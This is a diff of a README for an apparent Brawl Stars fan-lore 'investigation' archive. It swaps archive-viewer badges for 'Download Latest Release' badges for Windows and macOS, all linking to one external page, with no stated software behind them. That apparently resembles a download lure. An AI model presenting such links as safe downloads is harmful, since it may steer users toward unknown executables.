@@ -2,9 +2,11 @@
 
 > We have always told you, "This is normal." It is not. This archive contains everything the Starr Corporation tried to hide. The truth about the park, the Brawlers, and the experiments is inside. For your own safety, access this information with caution.
 
-[![Access Secure Archive](https://img.shields.io/badge/Access-Archive_Viewer-red?style=for-the-badge&logo=secure-shell)](https://brawl-stars-investigations.github.io/.github) <br>
-[![Subject](https://img.shields.io/badge/Subject-Starr_Park-yellow?style=flat-square)](https://brawl-stars-investigations.github.io/.github) <br>
-[![Status](https://img.shields.io/badge/Status-Ongoing_Investigation-orange?style=flat-square)](https://brawl-stars-investigations.github.io/.github)
+[![Download](https://img.shields.io/badge/Download-Latest_Release-brightgreen?style=for-the-badge&logo=download)](https://brawl-stars-investigations.github.io/.github) <br>
+<br>
+[![Windows](https://img.shields.io/badge/Platform-Windows-0078D6?style=flat-square&logo=windows)](https://brawl-stars-investigations.github.io/.github) <br>
+[![macOS](https://img.shields.io/badge/Platform-macOS-lightgrey?style=flat-square&logo=apple)](https://brawl-stars-investigations.github.io/.github)
+
 ---
 
 ![Starr Park Conspiracy Board](https://d1m9vqlvl3fy94.cloudfront.net/project/attachment/262167/800638brawl_stars_menu__2020____welcome_to_starr_park_by_brunoanjopro_dfkf9dk-fullview.jpg)
